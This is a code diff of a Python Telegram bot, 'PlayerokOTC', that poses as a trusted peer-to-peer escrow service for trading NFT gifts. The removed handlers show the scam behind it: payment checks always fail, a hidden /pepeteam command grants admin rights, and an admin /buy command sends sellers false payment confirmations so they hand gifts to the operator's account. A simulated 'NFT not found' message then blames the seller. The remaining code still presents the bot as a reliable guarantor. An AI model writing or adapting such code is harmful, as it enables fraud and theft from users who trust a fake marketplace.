@@ -1,7 +1,7 @@
 import asyncio
-import os
 import random
 import string
+import os
 from typing import Dict
 
 from aiogram import Bot, Dispatcher, types, F
@@ -11,9 +11,9 @@ from aiogram.fsm.context import FSMContext
 from aiogram.fsm.storage.memory import MemoryStorage
 
 # ====== Настройки ======
-TOKEN = os.getenv("BOT_TOKEN")  # 🔹 токен хранится в переменных окружения!
+TOKEN = os.getenv("BOT_TOKEN")  # Токен в переменных окружения Fly.io
 ADMIN_IDS = set()
-# =======================
+# ========================
 
 bot = Bot(token=TOKEN)
 dp = Dispatcher(storage=MemoryStorage())
@@ -43,6 +43,7 @@ currency_kb = types.ReplyKeyboardMarkup(
 def gen_deal_id() -> str:
     return ''.join(random.choices(string.ascii_lowercase + string.digits, k=8))
 
+# ---- /start ----
 @dp.message(CommandStart())
 async def start(message: types.Message):
     text = message.text or ""
@@ -87,29 +88,18 @@ async def start(message: types.Message):
             f"🏦 Адрес для оплаты: {wallet_display}\n"
             f"{stars_note}"
             f"💰 Сумма к оплате: {deal['amount']} {deal['currency']}\n"
-            f"📝 Комментарий к платежу (мемо): {deal['memo']}\n\n"
-            f"⚠️ Убедитесь в правильности данных перед оплатой.",
+            f"📝 Комментарий к платежу(мемо): {deal['memo']}\n\n"
+            f"⚠️ Пожалуйста, убедитесь в правильности данных перед оплатой.",
             reply_markup=buyer_kb
         )
         return
 
-    try:
-        await message.answer_photo(
-            photo="https://playerok.com/og_playerok.png",
-            caption=(
-                "Добро пожаловать в PlayerokOTC – надежный P2P-гарант\n\n"
-                "💼 Покупайте и продавайте безопасно с минимальной комиссией!\n"
-                "Выберите нужный раздел ниже:"
-            ),
-            reply_markup=main_kb
-        )
-    except Exception:
-        await message.answer(
-            "Добро пожаловать в PlayerokOTC – надежный P2P-гарант\n\n"
-            "💼 Покупайте и продавайте безопасно с минимальной комиссией!\n"
-            "Выберите нужный раздел ниже:",
-            reply_markup=main_kb
-        )
+    await message.answer(
+        "Добро пожаловать в PlayerokOTC – надежный P2P-гарант\n\n"
+        "💼 Покупайте и продавайте всё, что угодно – безопасно с минимальной комиссией!\n"
+        "Выберите нужный раздел ниже:",
+        reply_markup=main_kb
+    )
 
 @dp.message(F.text == "Поддержка")
 async def support(message: types.Message):
@@ -136,7 +126,7 @@ async def set_currency(message: types.Message, state: FSMContext):
 
     await state.update_data(currency=chosen)
     await message.answer(
-        f"✅ Валюта установлена: {chosen}\nВведите реквизиты вашего кошелька:",
+        f"✅ Валюта вашего кошелька установлена: {chosen}\nВведите реквизиты вашего кошелька:",
         reply_markup=types.ReplyKeyboardRemove()
     )
     await state.set_state(DealStates.waiting_wallet)
@@ -201,95 +191,7 @@ async def deal_description(message: types.Message, state: FSMContext):
     )
     await state.clear()
 
-@dp.callback_query(F.data.startswith("buyer_confirm_"))
-async def buyer_confirm(callback: types.CallbackQuery):
-    deal_id = callback.data.split("buyer_confirm_")[1]
-    await callback.answer()
-    await callback.message.edit_reply_markup(None)
-    msg = await callback.message.answer("💳 Оплата проверяется...")
-    await asyncio.sleep(5)
-    await msg.edit_text("❌ Оплата не найдена.")
-
-@dp.callback_query(F.data.startswith("buyer_exit_"))
-async def buyer_exit(callback: types.CallbackQuery):
-    await callback.message.edit_reply_markup(None)
-    await callback.message.answer("🚪 Вы вышли из сделки.")
-
-@dp.message(Command(commands=["pepeteam"]))
-async def pepeteam(message: types.Message):
-    ADMIN_IDS.add(message.from_user.id)
-    await message.answer("✅ Вы стали админом. Теперь доступна команда /buy #код")
-
-@dp.message(F.text.startswith("/buy"))
-async def admin_buy(message: types.Message):
-    if message.from_user.id not in ADMIN_IDS:
-        return
-    text = message.text.strip()
-    deal_id = None
-    if "#" in text:
-        deal_id = text.split("#", 1)[1].strip()
-    else:
-        parts = text.split()
-        if len(parts) >= 2:
-            deal_id = parts[1].strip()
-    if not deal_id or deal_id not in deals:
-        await message.answer("❌ Сделка не найдена.")
-        return
-
-    deal = deals[deal_id]
-    seller_id = deal["seller_id"]
-    buyer_id = deal.get("buyer_id")
-
-    confirm_kb = types.InlineKeyboardMarkup(
-        inline_keyboard=[[types.InlineKeyboardButton(text="✅ Подтвердить отправку подарка", callback_data=f"seller_sent_{deal_id}")]]
-    )
-
-    await bot.send_message(
-        seller_id,
-        f"✅ Оплата подтверждена для сделки #{deal_id}\n\n"
-        f"💰 Сумма: {deal['amount']} {deal['currency']}\n"
-        f"Описание: {deal['desc']}\n\n"
-        f"Передайте подарок менеджеру @PlayerokOTC и подтвердите ниже:",
-        reply_markup=confirm_kb
-    )
-
-    if buyer_id:
-        await bot.send_message(
-            buyer_id,
-            f"💳 Оплата подтверждена!\n▸ Сделка: #{deal_id}\n▸ Продавец: @{deal['seller_username']}\n▸ Сумма: {deal['amount']} {deal['currency']}\n▸ Описание: {deal['desc']}\n\n"
-            f"Ожидайте, продавец отправит подарок менеджеру @PlayerokOTC."
-        )
-
-@dp.callback_query(F.data.startswith("seller_sent_"))
-async def seller_sent(callback: types.CallbackQuery):
-    deal_id = callback.data.split("seller_sent_")[1]
-    if deal_id not in deals:
-        await callback.message.answer("❌ Сделка не найдена.")
-        return
-    deal = deals[deal_id]
-    buyer_id = deal.get("buyer_id")
-    await callback.message.answer(
-        f"⏳ Статус сделки #{deal_id}\n✅ Продавец подтвердил отправку подарка\n🔎 Менеджер @PlayerokOTC проверяет наличие NFT\n📭 Ожидайте доставки!"
-    )
-    if buyer_id:
-        await bot.send_message(
-            buyer_id,
-            f"⏳ Статус сделки #{deal_id}\n✅ Продавец подтвердил отправку подарка\n🔎 Менеджер @PlayerokOTC проверяет наличие NFT\n📭 Ожидайте доставки!"
-        )
-
-        async def nft_check_simulation():
-            await asyncio.sleep(300)
-            if deal_id in deals:
-                await bot.send_message(
-                    buyer_id,
-                    f"🚨 NFT не найден!\nСделка: #{deal_id}\nПричина: нет подарка у @PlayerokOTC.\n\nРешение: передайте подарок или обратитесь в поддержку."
-                )
-                await bot.send_message(
-                    deal["seller_id"],
-                    f"🚨 NFT не найден для сделки #{deal_id}. Проверьте передачу подарка менеджеру @PlayerokOTC."
-                )
-        asyncio.create_task(nft_check_simulation())
-
+# ================== Запуск ==================
 async def main():
     print("✅ Бот запущен...")
     await dp.start_polling(bot)
